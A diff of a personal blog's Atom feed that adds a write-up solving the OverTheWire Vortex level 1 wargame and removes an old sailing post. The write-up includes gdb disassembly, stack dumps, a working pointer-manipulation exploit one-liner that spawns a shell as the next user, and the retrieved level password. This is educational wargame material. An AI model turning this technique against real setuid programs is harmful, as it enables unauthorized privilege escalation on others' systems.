@@ -4,7 +4,7 @@
   <title><![CDATA[David Xia]]></title>
   <link href="https://www.davidxia.com/atom.xml" rel="self"/>
   <link href="https://www.davidxia.com/"/>
-  <updated>2020-11-01T18:14:59-05:00</updated>
+  <updated>2020-12-25T20:36:26-05:00</updated>
   <id>https://www.davidxia.com/</id>
   <author>
     <name><![CDATA[David Xia]]></name>
@@ -12,6 +12,400 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[My Solution to Over the Wire Vortex Level 1 -> 2]]></title>
+    <link href="https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2/"/>
+    <updated>2020-12-25T20:21:28-05:00</updated>
+    <id>https://www.davidxia.com/2020/12/my-solution-to-over-the-wire-vortex-level-1-2</id>
+    <content type="html"><![CDATA[<p>I recently found a whole new series of online wargames at [overthewire.org][].
+Here&rsquo;s my solution for the second level &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex1.html">Vortex Level 1 -> Level 2</a>&rdquo;</p>
+
+<p>The levels are cumulative. We have to beat the previous level in order to access the next. This
+solution assumes we have solved &ldquo;<a href="https://overthewire.org/wargames/vortex/vortex0.html">Vortex Level 0 -> Level 1</a>&rdquo; and can SSH into the
+machine as user vortex1. Caveat: the machine is extremely slow&hellip;</p>
+
+<!-- more -->
+
+
+<p>First let&rsquo;s find out some information about the machine.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ssh vortex1@vortex.labs.overthewire.org -p 2228
+</span><span class='line'>                 _
+</span><span class='line'>__   _____  _ __| |_ _____  __
+</span><span class='line'>\ \ / / _ \| '__| __/ _ \ \/ /
+</span><span class='line'> \ V / (_) | |  | ||  __/&gt;  &lt;
+</span><span class='line'>  \_/ \___/|_|   \__\___/_/\_\
+</span><span class='line'>
+</span><span class='line'>a http://www.overthewire.org wargame.
+</span><span class='line'>
+</span><span class='line'>vortex1@vortex.labs.overthewire.org's password:
+</span><span class='line'>Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-92-generic x86_64)
+</span><span class='line'>
+</span><span class='line'> * Documentation:  https://help.ubuntu.com/
+</span><span class='line'>
+</span><span class='line'>The programs included with the Ubuntu system are free software;
+</span><span class='line'>the exact distribution terms for each program are described in the
+</span><span class='line'>individual files in /usr/share/doc/*/copyright.
+</span><span class='line'>
+</span><span class='line'>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+</span><span class='line'>applicable law.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s a machine running Ubuntu 14.04.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vortex1@vortex:~$ uname -i
+</span><span class='line'>x86_64</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s a 64-bit system.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vortex1@vortex:~$ cat /proc/sys/kernel/randomize_va_space
+</span><span class='line'>0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>ASLR is disabled.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>vortex1@vortex:~$ gdb /vortex/vortex1
+</span><span class='line'>GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
+</span><span class='line'>Copyright (C) 2014 Free Software Foundation, Inc.
+</span><span class='line'>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span><span class='line'>This is free software: you are free to change and redistribute it.
+</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+</span><span class='line'>and "show warranty" for details.
+</span><span class='line'>This GDB was configured as "x86_64-linux-gnu".
+</span><span class='line'>Type "show configuration" for configuration details.
+</span><span class='line'>For bug reporting instructions, please see:
+</span><span class='line'>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
+</span><span class='line'>Find the GDB manual and other documentation resources online at:
+</span><span class='line'>&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
+</span><span class='line'>For help, type "help".
+</span><span class='line'>Type "apropos word" to search for commands related to "word"...
+</span><span class='line'>Reading symbols from /vortex/vortex1...(no debugging symbols found)...done.
+</span><span class='line'>
+</span><span class='line'>(gdb) set disassembly-flavor intel
+</span><span class='line'>(gdb) set pagination off
+</span><span class='line'>(gdb) disassemble main
+</span><span class='line'>Dump of assembler code for function main:
+</span><span class='line'>   0x080485c0 &lt;+0&gt;: push   ebp
+</span><span class='line'>   0x080485c1 &lt;+1&gt;: mov    ebp,esp
+</span><span class='line'>   0x080485c3 &lt;+3&gt;: push   esi
+</span><span class='line'>   0x080485c4 &lt;+4&gt;: push   ebx
+</span><span class='line'>   0x080485c5 &lt;+5&gt;: and    esp,0xfffffff0
+</span><span class='line'>   0x080485c8 &lt;+8&gt;: sub    esp,0x220                  # Set stack pointer
+</span><span class='line'>   0x080485ce &lt;+14&gt;:    mov    eax,gs:0x14
+</span><span class='line'>   0x080485d4 &lt;+20&gt;:    mov    DWORD PTR [esp+0x21c],eax  
+</span><span class='line'>   0x080485db &lt;+27&gt;:    xor    eax,eax
+</span><span class='line'>   0x080485dd &lt;+29&gt;:    lea    eax,[esp+0x1c]
+</span><span class='line'>   0x080485e1 &lt;+33&gt;:    add    eax,0x100                  # + (sizeof(buf) / 2)
+</span><span class='line'>   0x080485e6 &lt;+38&gt;:    mov    DWORD PTR [esp+0x14],eax   # ptr is located at $esp + 0x14
+</span><span class='line'>   0x080485ea &lt;+42&gt;:    jmp    0x804868e &lt;main+206&gt;
+</span><span class='line'>   0x080485ef &lt;+47&gt;:    mov    eax,DWORD PTR [esp+0x18]
+</span><span class='line'>   0x080485f3 &lt;+51&gt;:    cmp    eax,0xa
+</span><span class='line'>   0x080485f6 &lt;+54&gt;:    je     0x80485ff &lt;main+63&gt;
+</span><span class='line'>   0x080485f8 &lt;+56&gt;:    cmp    eax,0x5c
+</span><span class='line'>   0x080485fb &lt;+59&gt;:    je     0x8048615 &lt;main+85&gt;
+</span><span class='line'>   0x080485fd &lt;+61&gt;:    jmp    0x804861c &lt;main+92&gt;
+</span><span class='line'>   0x080485ff &lt;+63&gt;:    mov    DWORD PTR [esp+0x4],0x200
+</span><span class='line'>   0x08048607 &lt;+71&gt;:    lea    eax,[esp+0x1c]
+</span><span class='line'>   0x0804860b &lt;+75&gt;:    mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x0804860e &lt;+78&gt;:    call   0x804856d &lt;print&gt;
+</span><span class='line'>   0x08048613 &lt;+83&gt;:    jmp    0x804868e &lt;main+206&gt;
+</span><span class='line'>   0x08048615 &lt;+85&gt;:    sub    DWORD PTR [esp+0x14],0x1
+</span><span class='line'>   0x0804861a &lt;+90&gt;:    jmp    0x804868e &lt;main+206&gt;
+</span><span class='line'>   0x0804861c &lt;+92&gt;:    mov    eax,DWORD PTR [esp+0x14]
+</span><span class='line'>   0x08048620 &lt;+96&gt;:    and    eax,0xff000000
+</span><span class='line'>   0x08048625 &lt;+101&gt;:   cmp    eax,0xca000000
+</span><span class='line'>   0x0804862a &lt;+106&gt;:   jne    0x804866b &lt;main+171&gt;
+</span><span class='line'>   0x0804862c &lt;+108&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
+</span><span class='line'>   0x08048631 &lt;+113&gt;:   mov    esi,eax
+</span><span class='line'>   0x08048633 &lt;+115&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
+</span><span class='line'>   0x08048638 &lt;+120&gt;:   mov    ebx,eax
+</span><span class='line'>   0x0804863a &lt;+122&gt;:   call   0x8048430 &lt;geteuid@plt&gt;
+</span><span class='line'>   0x0804863f &lt;+127&gt;:   mov    DWORD PTR [esp+0x8],esi
+</span><span class='line'>   0x08048643 &lt;+131&gt;:   mov    DWORD PTR [esp+0x4],ebx
+</span><span class='line'>   0x08048647 &lt;+135&gt;:   mov    DWORD PTR [esp],eax
+</span><span class='line'>   0x0804864a &lt;+138&gt;:   call   0x80483e0 &lt;setresuid@plt&gt;
+</span><span class='line'>   0x0804864f &lt;+143&gt;:   mov    DWORD PTR [esp+0x8],0x0
+</span><span class='line'>   0x08048657 &lt;+151&gt;:   mov    DWORD PTR [esp+0x4],0x804876a
+</span><span class='line'>   0x0804865f &lt;+159&gt;:   mov    DWORD PTR [esp],0x804876d
+</span><span class='line'>   0x08048666 &lt;+166&gt;:   call   0x8048420 &lt;execlp@plt&gt;
+</span><span class='line'>   0x0804866b &lt;+171&gt;:   lea    eax,[esp+0x1c]
+</span><span class='line'>   0x0804866f &lt;+175&gt;:   add    eax,0x200
+</span><span class='line'>   0x08048674 &lt;+180&gt;:   cmp    DWORD PTR [esp+0x14],eax
+</span><span class='line'>   0x08048678 &lt;+184&gt;:   jbe    0x804867c &lt;main+188&gt;
+</span><span class='line'>   0x0804867a &lt;+186&gt;:   jmp    0x804868d &lt;main+205&gt;
+</span><span class='line'>   0x0804867c &lt;+188&gt;:   mov    eax,DWORD PTR [esp+0x14]
+</span><span class='line'>   0x08048680 &lt;+192&gt;:   lea    edx,[eax+0x1]
+</span><span class='line'>   0x08048683 &lt;+195&gt;:   mov    DWORD PTR [esp+0x14],edx
+</span><span class='line'>   0x08048687 &lt;+199&gt;:   mov    edx,DWORD PTR [esp+0x18]
+</span><span class='line'>   0x0804868b &lt;+203&gt;:   mov    BYTE PTR [eax],dl
+</span><span class='line'>   0x0804868d &lt;+205&gt;:   nop
+</span><span class='line'>   0x0804868e &lt;+206&gt;:   call   0x8048400 &lt;getchar@plt&gt;
+</span><span class='line'>   0x08048693 &lt;+211&gt;:   mov    DWORD PTR [esp+0x18],eax          # x is located at $esp + 0x18
+</span><span class='line'>   0x08048697 &lt;+215&gt;:   cmp    DWORD PTR [esp+0x18],0xffffffff
+</span><span class='line'>   0x0804869c &lt;+220&gt;:   jne    0x80485ef &lt;main+47&gt;
+</span><span class='line'>   0x080486a2 &lt;+226&gt;:   mov    DWORD PTR [esp],0x8048775
+</span><span class='line'>   0x080486a9 &lt;+233&gt;:   call   0x8048440 &lt;puts@plt&gt;
+</span><span class='line'>   0x080486ae &lt;+238&gt;:   mov    eax,0x0
+</span><span class='line'>   0x080486b3 &lt;+243&gt;:   mov    ecx,DWORD PTR [esp+0x21c]
+</span><span class='line'>   0x080486ba &lt;+250&gt;:   xor    ecx,DWORD PTR gs:0x14
+</span><span class='line'>   0x080486c1 &lt;+257&gt;:   je     0x80486c8 &lt;main+264&gt;
+</span><span class='line'>   0x080486c3 &lt;+259&gt;:   call   0x8048410 &lt;__stack_chk_fail@plt&gt;
+</span><span class='line'>   0x080486c8 &lt;+264&gt;:   lea    esp,[ebp-0x8]
+</span><span class='line'>   0x080486cb &lt;+267&gt;:   pop    ebx
+</span><span class='line'>   0x080486cc &lt;+268&gt;:   pop    esi
+</span><span class='line'>   0x080486cd &lt;+269&gt;:   pop    ebp
+</span><span class='line'>   0x080486ce &lt;+270&gt;:   ret
+</span><span class='line'>End of assembler dump.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can see that on main+8, the stack pointer <code>esp</code> is decreased by 0x220 to make room for <code>unsigned
+char buf[512]</code>, <code>unsigned char *ptr</code>, and <code>unsigned int x</code>. If we look more closely at the assembly,
+we can see <code>ptr</code> is located at <code>esp + 0x14</code> because the instruction before that increases <code>eax</code> by
+<code>0x100</code> or <code>(sizeof(buf) / 2)</code> or 256. <code>main+211</code> shows <code>x</code> is located right after <code>ptr</code> at <code>esp +
+0x18</code> since the instruction right before calls <code>getchar()</code>. This means <code>buf[512]</code> is after that and
+takes up the majority of the stack. So the stack layout is <code>ptr</code>, <code>x</code>, then <code>buf[512]</code>. This makes
+sense because the compiler on more modern systems will put buffers after other variables to protect
+against buffer overflows.</p>
+
+<p>Question: why is the size of <code>ptr</code> only 4 bytes? I thought on 64-bit systems pointer variables are 8
+bytes not 4 since memory should be 64-bit- or 8-byte-addressable?</p>
+
+<p>We set a breakpoint at the <code>getchar()</code> call and run the program. Examine the first 64 words of <code>esp</code>
+in hexadecimal.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) break *main+206
+</span><span class='line'>Breakpoint 1 at 0x804868e
+</span><span class='line'>
+</span><span class='line'>(gdb) run
+</span><span class='line'>Starting program: /vortex/vortex1
+</span><span class='line'>
+</span><span class='line'>Breakpoint 1, 0x0804868e in main ()
+</span><span class='line'>
+</span><span class='line'>(gdb) x/64wx $esp
+</span><span class='line'>0xffffd4c0:   0xf7e303b4  0xf7fd81a8  0x00000000  0xf7fec4a8
+</span><span class='line'>0xffffd4d0:   0x00000007  0xffffd5dc  0x00000001  0x00000000
+</span><span class='line'>0xffffd4e0:   0x00000001  0xf7fd81a8  0xf7ffd000  0xf7fe6d3b
+</span><span class='line'>0xffffd4f0:   0xf7ffc000  0x00001000  0x00000001  0xf7fe6cfc
+</span><span class='line'>0xffffd500:   0xf7ffd000  0x00000000  0xffffd5c8  0xf7fe724b
+</span><span class='line'>0xffffd510:   0xf7ffdaf0  0xf7fd8760  0x00000001  0x00000001
+</span><span class='line'>0xffffd520:   0x00000000  0xf7ff578c  0x00000000  0x00000000
+</span><span class='line'>0xffffd530:   0xf7ffd55c  0xffffd598  0xffffd5b8  0x00000000
+</span><span class='line'>0xffffd540:   0xf7ff578c  0xf7ffd55c  0xffffd5b8  0xf7fdc4ac
+</span><span class='line'>0xffffd550:   0xf7fdc2dc  0xf7fe4f3d  0xf7e36061  0x080482ff
+</span><span class='line'>0xffffd560:   0x00000000  0xf7fdc33c  0x00000000  0xf7fdc000
+</span><span class='line'>0xffffd570:   0x00000040  0x00000002  0x0804827d  0xf7ffdc24
+</span><span class='line'>0xffffd580:   0xf7e226bc  0xf7ffd000  0xf7e26cc4  0x00000001
+</span><span class='line'>0xffffd590:   0xf7fd8460  0xf7fe5694  0x00000000  0x00000000
+</span><span class='line'>0xffffd5a0:   0x00000000  0x00000000  0xf7fd8460  0x00000003
+</span><span class='line'>0xffffd5b0:   0xffffd5e0  0x07b1ea71  0xf63d4e2e  0xf7e26ed4</span></code></pre></td></tr></table></div></figure>
+
+
+<p><code>ptr</code> is located at <code>$esp + 0x14 = 0xffffd4d4</code> which is initialized with a value of <code>0xffffd5dc</code>.
+Since ASLR is disabled, this location is fixed.</p>
+
+<p>I first thought of a brute-force strategy of decrementing <code>ptr</code>&rsquo;s value with <code>\</code> until its highest
+byte was <code>0xca</code>. That way, when it&rsquo;s bit-wise ANDed with <code>0xff000000</code>, the result would be
+<code>0xca000000</code>. The exploit command would be the following.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(python -c 'import sys; sys.stdout.write("\\" * (0xffffe470-0xcaffffff) + "\x00")'; cat) \
+</span><span class='line'>  | /vortex/vortex1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Aside: the Python command is run in a subshell with an extra <code>cat</code> to keep the <code>/bin/sh</code> listening
+to more input from the stdout of that subshell. That way we can add more commands from your
+terminal. The Python command triggers the <code>/bin/sh</code>. The <code>cat</code> with no args just reads from the
+current stdin and feeds data to <code>/bin/sh</code>. See this <a href="https://security.stackexchange.com/a/155845/4350">Stack Exchange answer</a>.</p>
+
+<p>This is most definitely not the &ldquo;right&rdquo; solution because 0xffffd5dc - 0xcaffffff = 0x34ffd5dd =
+889,181,661. If written to disk, this file be almost a gigabyte.</p>
+
+<p>Let&rsquo;s think of a better solution. There&rsquo;s no lower bound checking on <code>ptr</code>&rsquo;s value. So we can
+decrement the value of ptr until it references its own memory address which starts at <code>0xffffd4d4</code>.
+Then we write <code>0xca</code> into the highest byte at <code>0xffffd4d7</code>. <code>ptr</code>&rsquo;s value is initialized to
+<code>0xffffd5dc</code>. So we write this many <code>\</code>: 0xffffd5dc - 0xffffd4d7 = 0x105 = 261. Instead of the
+seemingly arbitrary 261, we&rsquo;ll use 512/2 + 5. This is more descriptive because it shows we&rsquo;re moving
+the <code>ptr</code> reference from where it starts in the middle of <code>buf[512]</code> back to the beginning and then
+past the <code>x</code> and one byte into itself.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(python -c 'import sys; sys.stdout.write("\\" * (512/2 + 5) + "\xca" + "A")'; cat) \
+</span><span class='line'>  | /vortex/vortex1
+</span><span class='line'>
+</span><span class='line'>id
+</span><span class='line'>uid=5002(vortex2) gid=5001(vortex1) groups=5002(vortex2),5001(vortex1)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The wargame instructions don&rsquo;t tell you this, but each user&rsquo;s password is located in the directory
+below. Now that we have a shell as vortex2, we can read the password to advance to the next level.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ls /etc/vortex_pass
+</span><span class='line'>vortex0   vortex11  vortex14  vortex17    vortex2   vortex22  vortex25  vortex5  vortex8
+</span><span class='line'>vortex1   vortex12  vortex15  vortex18    vortex20  vortex23  vortex3   vortex6  vortex9
+</span><span class='line'>vortex10  vortex13  vortex16  vortex19    vortex21  vortex24  vortex4   vortex7
+</span><span class='line'>
+</span><span class='line'>cat /etc/vortex_pass/vortex2
+</span><span class='line'>23anbT\rE</span></code></pre></td></tr></table></div></figure>
+
+
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[My Solution to Exploit Exercises Protostar Final2 Level]]></title>
@@ -5046,40 +5440,6 @@ community, allowing it to influence key decision-makers on a range of issues ove
 London, Cambridge, Seven Sisters, Jurassic Coast, Lyme Regis, and Lulworth Cove.</p>
 
 <iframe class="fill-width" width="540" height="304" src="https://www.youtube-nocookie.com/embed/seJO_6-Tk2Q?rel=0" frameborder="0" allowfullscreen></iframe>
-
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[My First Sailing Class]]></title>
-    <link href="https://www.davidxia.com/2016/07/my-first-sailing-class/"/>
-    <updated>2016-07-24T13:37:56-04:00</updated>
-    <id>https://www.davidxia.com/2016/07/my-first-sailing-class</id>
-    <content type="html"><![CDATA[<p>Last weekend a bunch of Spotify collleagues and I took our first sailing classes at Manhattan Yacht
-Club in Jersey City. I could get used to this sport. The sun was brutal though. I&rsquo;ll never get used
-to that.</p>
-
-<iframe class="fill-width" width="540" height="405" src="https://www.youtube.com/embed/8hPEr4sa-YM" frameborder="0" allowfullscreen></iframe>
-
-
-
-
-<!-- more -->
-
-
-<p><img class="center" src="https://i.imgur.com/g6jwSpXl.jpg" width="480" height="640"></p>
-
-<div class='image center'><img  src="https://i.imgur.com/rbyvOtml.jpg" width="480" height="640" title="I had to wear a hot and stuffy life vest on a 90-degree day." ><div class='caption'>I had to wear a hot and stuffy life vest on a 90-degree day.</div></div>
-
-
-
-
-<div class='image center'><img  src="https://i.imgur.com/5cHxUtKl.jpg" width="480" height="640" title="A great view of lower Manhattan." ><div class='caption'>A great view of lower Manhattan.</div></div>
-
-
-
-
-<div class='image center'><img  src="https://i.imgur.com/ivnVCYXl.jpg" width="480" height="640" title="Sailing close to the Statue of Liberty." ><div class='caption'>Sailing close to the Statue of Liberty.</div></div>
 
 ]]></content>
   </entry>
